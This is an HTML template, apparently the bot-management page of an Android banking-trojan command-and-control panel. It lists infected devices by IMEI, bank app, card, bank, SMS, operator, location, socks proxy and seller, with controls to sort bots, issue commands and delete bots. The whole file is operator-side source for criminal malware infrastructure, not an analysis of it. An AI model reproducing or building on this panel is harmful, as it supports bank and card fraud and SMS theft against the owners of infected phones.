
<div class="demo-charts mdl-shadow--2dp mdl-cell mdl-cell--12-col mdl-grid" style="background-color: #37474f;">	
            <h5 style="color: white;"><i class="material-icons" style="color: white; margin-right: 20px;">poll</i>Total Bots: %%PLACE_TOTAL_BOTS_HERE%%</h5>
</div>

<div  class="demo-charts mdl-color--white mdl-shadow--2dp mdl-cell mdl-cell--12-col mdl-grid">
	<div id = "commands_modal" style="display:none; width:100%;"></div>
	<select id="sort" name="sort" style="margin-top: 15px;">
		<option value="bank">Bank App</option>
		<option value="version">Android</option>
		<option value="country">Country</option>
		<option value="version_apk">Seller</option>
		<option value="lastConnect">Online</option>
	</select>


<button style="margin-left: 10px;margin-top: 15px;" class="mdl-button mdl-js-button mdl-button--raised mdl-js-ripple-effect" onclick="location.href='index.php?command=botlist&sort=' + $('#sort').val();"><i class="material-icons">sort</i>Sort
</button>
<button style="margin-left: 10px;margin-top: 15px;" class="mdl-button mdl-js-button mdl-button--raised mdl-js-ripple-effect" onclick='get_modal_commands();'><i class="material-icons">language</i>Get commands
</button>
<!--<button style="margin-left: 10px;margin-top: 15px;" class="mdl-button mdl-js-button mdl-button--raised mdl-js-ripple-effect" onclick='get_modal_banks();'><i class="material-icons">account_balance</i>Bank commands
</button>-->
<button style="margin-left: 10px;margin-top: 15px;" class="mdl-button mdl-js-button mdl-button--raised mdl-js-ripple-effect" onclick='delete_checked_bots();'><i class="material-icons">delete</i>Delete
</button>
<div class="mdl-textfield mdl-js-textfield mdl-textfield--floating-label" style="margin-left: 20px;width: 180px;">
    <input class="mdl-textfield__input" type="text" id="IMEI_search">
    <label class="mdl-textfield__label" for="IMEI_search">IMEI search...</label>
</div>
<button style="margin-left: 10px;margin-top: 15px;" class="mdl-button" onclick="location.href='index.php?command=botlist&imei=' + $('#IMEI_search').val();"><i class="material-icons">search</i>
</button>
<div style="width: 100%; margin-top: 10px;" class="demo-charts mdl-color--white mdl-shadow--2dp mdl-grid">
	<div style="margin-left: 10px;">
		<label class="mdl-checkbox mdl-js-checkbox mdl-js-ripple-effect" for="col_imei">
		  <input type="checkbox" id="col_imei" class="mdl-checkbox__input" %%PLACE_imei_CHECKBOX_HERE%%>
		  <span class="mdl-checkbox__label">IMEI</span>
		</label>
	</div>
	<div style="margin-left: 10px;">
		<label class="mdl-checkbox mdl-js-checkbox mdl-js-ripple-effect" for="col_android">
		  <input type="checkbox" id="col_android" class="mdl-checkbox__input" %%PLACE_android_CHECKBOX_HERE%%>
		  <span class="mdl-checkbox__label">Android</span>
		</label>
	</div>
	<!--<div style="margin-left: 10px;">
		<label class="mdl-checkbox mdl-js-checkbox mdl-js-ripple-effect" for="col_root">
		  <input type="checkbox" id="col_root" class="mdl-checkbox__input" %%PLACE_root_CHECKBOX_HERE%%>
		  <span class="mdl-checkbox__label">root</span>
		</label>
	</div>-->
	<div style="margin-left: 10px;">
		<label class="mdl-checkbox mdl-js-checkbox mdl-js-ripple-effect" for="col_country">
		  <input type="checkbox" id="col_country" class="mdl-checkbox__input" %%PLACE_country_CHECKBOX_HERE%%>
		  <span class="mdl-checkbox__label">Country</span>
		</label>
	</div>
	<div style="margin-left: 10px;">
		<label class="mdl-checkbox mdl-js-checkbox mdl-js-ripple-effect" for="col_seller">
		  <input type="checkbox" id="col_seller" class="mdl-checkbox__input" %%PLACE_seller_CHECKBOX_HERE%%>
		  <span class="mdl-checkbox__label">Seller</span>
		</label>
	</div>
	<div style="margin-left: 10px;">
		<label class="mdl-checkbox mdl-js-checkbox mdl-js-ripple-effect" for="col_online">
		  <input type="checkbox" id="col_online" class="mdl-checkbox__input" %%PLACE_online_CHECKBOX_HERE%%>
		  <span class="mdl-checkbox__label">Online</span>
		</label>
	</div>
	<div style="margin-left: 10px;">
		<label class="mdl-checkbox mdl-js-checkbox mdl-js-ripple-effect" for="col_lastcon">
		  <input type="checkbox" id="col_lastcon" class="mdl-checkbox__input" %%PLACE_lastcon_CHECKBOX_HERE%%>
		  <span class="mdl-checkbox__label">Last connect</span>
		</label>
	</div>
	<div style="margin-left: 10px;">
		<label class="mdl-checkbox mdl-js-checkbox mdl-js-ripple-effect" for="col_firstcon">
		  <input type="checkbox" id="col_firstcon" class="mdl-checkbox__input" %%PLACE_firstcon_CHECKBOX_HERE%%>
		  <span class="mdl-checkbox__label">First connect</span>
		</label>
	</div>
	<div style="margin-left: 10px;">
		<label class="mdl-checkbox mdl-js-checkbox mdl-js-ripple-effect" for="col_bankapp">
		  <input type="checkbox" id="col_bankapp" class="mdl-checkbox__input" %%PLACE_bankapp_CHECKBOX_HERE%%>
		  <span class="mdl-checkbox__label">Bank App</span>
		</label>
	</div>
	<div style="margin-left: 10px;">
		<label class="mdl-checkbox mdl-js-checkbox mdl-js-ripple-effect" for="col_card">
		  <input type="checkbox" id="col_card" class="mdl-checkbox__input" %%PLACE_card_CHECKBOX_HERE%%>
		  <span class="mdl-checkbox__label">Card</span>
		</label>
	</div>
	<div style="margin-left: 10px;">
		<label class="mdl-checkbox mdl-js-checkbox mdl-js-ripple-effect" for="col_bank">
		  <input type="checkbox" id="col_bank" class="mdl-checkbox__input" %%PLACE_bank_CHECKBOX_HERE%%>
		  <span class="mdl-checkbox__label">Bank</span>
		</label>
	</div>
	<div style="margin-left: 10px;">
		<label class="mdl-checkbox mdl-js-checkbox mdl-js-ripple-effect" for="col_sms">
		  <input type="checkbox" id="col_sms" class="mdl-checkbox__input" %%PLACE_sms_CHECKBOX_HERE%%>
		  <span class="mdl-checkbox__label">SMS</span>
		</label>
	</div>
	<div style="margin-left: 10px;">
		<label class="mdl-checkbox mdl-js-checkbox mdl-js-ripple-effect" for="col_comment">
		  <input type="checkbox" id="col_comment" class="mdl-checkbox__input" %%PLACE_comment_CHECKBOX_HERE%%>
		  <span class="mdl-checkbox__label">Comment</span>
		</label>
	</div>
	<div style="margin-left: 10px;">
		<label class="mdl-checkbox mdl-js-checkbox mdl-js-ripple-effect" for="col_screen">
		  <input type="checkbox" id="col_screen" class="mdl-checkbox__input" %%PLACE_screen_CHECKBOX_HERE%%>
		  <span class="mdl-checkbox__label">Screen</span>
		</label>
	</div>
	<div style="margin-left: 10px;">
		<label class="mdl-checkbox mdl-js-checkbox mdl-js-ripple-effect" for="col_number">
		  <input type="checkbox" id="col_number" class="mdl-checkbox__input" %%PLACE_number_CHECKBOX_HERE%%>
		  <span class="mdl-checkbox__label">Operator</span>
		</label>
	</div>
	<div style="margin-left: 10px;">
		<label class="mdl-checkbox mdl-js-checkbox mdl-js-ripple-effect" for="col_model">
		  <input type="checkbox" id="col_model" class="mdl-checkbox__input" %%PLACE_model_CHECKBOX_HERE%%>
		  <span class="mdl-checkbox__label">Model</span>
		</label>
	</div>
	<div style="margin-left: 10px;">
		<label class="mdl-checkbox mdl-js-checkbox mdl-js-ripple-effect" for="col_city">
		  <input type="checkbox" id="col_city" class="mdl-checkbox__input" %%PLACE_city_CHECKBOX_HERE%%>
		  <span class="mdl-checkbox__label">City</span>
		</label>
	</div>
	<div style="margin-left: 10px;">
		<label class="mdl-checkbox mdl-js-checkbox mdl-js-ripple-effect" for="col_regionName">
		  <input type="checkbox" id="col_regionName" class="mdl-checkbox__input" %%PLACE_regionName_CHECKBOX_HERE%%>
		  <span class="mdl-checkbox__label">Region</span>
		</label>
	</div>
	<div style="margin-left: 10px;">
		<label class="mdl-checkbox mdl-js-checkbox mdl-js-ripple-effect" for="col_zip">
		  <input type="checkbox" id="col_zip" class="mdl-checkbox__input" %%PLACE_zip_CHECKBOX_HERE%%>
		  <span class="mdl-checkbox__label">zip</span>
		</label>
	</div>
	<div style="margin-left: 10px;">
		<label class="mdl-checkbox mdl-js-checkbox mdl-js-ripple-effect" for="col_socks">
		  <input type="checkbox" id="col_socks" class="mdl-checkbox__input" %%PLACE_socks_CHECKBOX_HERE%%>
		  <span class="mdl-checkbox__label">Socks</span>
		</label>
	</div>
	<div style="margin-left: 10px;">
		<label class="mdl-checkbox mdl-js-checkbox mdl-js-ripple-effect" for="col_internet">
		  <input type="checkbox" id="col_internet" class="mdl-checkbox__input" %%PLACE_internet_CHECKBOX_HERE%%>
		  <span class="mdl-checkbox__label">Internet</span>
		</label>
	</div>
	<div style="margin-left: 10px;">
		<label class="mdl-checkbox mdl-js-checkbox mdl-js-ripple-effect" for="col_ip">
		  <input type="checkbox" id="col_ip" class="mdl-checkbox__input" %%PLACE_ip_CHECKBOX_HERE%%>
		  <span class="mdl-checkbox__label">IP</span>
		</label>
	</div>
	<div style="margin-left: 10px;">
		<label class="mdl-checkbox mdl-js-checkbox mdl-js-ripple-effect" for="col_jabber">
		  <input type="checkbox" id="col_jabber" class="mdl-checkbox__input" %%PLACE_jabber_CHECKBOX_HERE%%>
		  <span class="mdl-checkbox__label">Jabber notifications</span>
		</label>
	</div>
	<div style="margin-left: 10px;">
		<label id="wide-label" class="mdl-navigation__link mdl-switch mdl-js-switch mdl-js-ripple-effect" for="wide-mode">
	        <input type="checkbox" id="wide-mode" class="mdl-switch__input" onchange="wide_mode()" %%PLACE_WIDEMODE_HERE%% >
	        <span class="mdl-switch__label" style="margin-right: 30px;">Wide mode</span>
	    </label>
    </div>
	<div style="margin-left: 10px;">
		<button class="mdl-button mdl-js-button mdl-button--raised mdl-js-ripple-effect" onclick="changeTableSettings('botlist');">
		  Apply changes
		</button>
	</div>
</div>

<div style="width: 100%; margin-top: 10px;">
	<table class="demo-charts mdl-js-data-table mdl-shadow--2dp tmain " cellpadding="1" align="center" width=100%>      
	<!--<thead>
		<th>IMEI</th>
		<th>Android</th>
		<th>Country</th>
		<th>Seller</th>
		<th>Online</th>
		<th>Last Connect</th>
        <th>Bank App</th>
        <th>Card</th>
        <th>Bank</th>
		<th>SMS</th>
        <th><input type="checkbox" id="chk_new" onclick="checkAll('chk');" /></th>
	</thead>-->
	%%PLACE_TABLE_HERE%%
	</table>
</div>

<div id = "logs_modal" style="display:none;"></div>
<div id = "commands_modal" style="display:none;"></div>

<div style="width: 100%">
<center>
	%%PLACE_BOTTOM_LINKS_HERE%%
</center>

</div>